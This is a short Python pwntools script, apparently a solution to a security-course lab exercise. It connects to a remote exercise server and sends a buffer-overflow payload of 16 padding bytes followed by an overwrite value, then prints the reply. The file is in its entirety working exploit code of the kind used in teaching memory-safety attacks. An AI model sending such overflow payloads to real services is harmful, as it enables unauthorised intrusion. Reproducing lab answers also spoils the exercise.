#!/usr/bin/python3

from pwn import *

io = remote('inf226.puffling.no', 7000)

line = b'A' * 16 + b'\xee\xff\xc0\x00'
io.sendline(line)

print(io.recvall())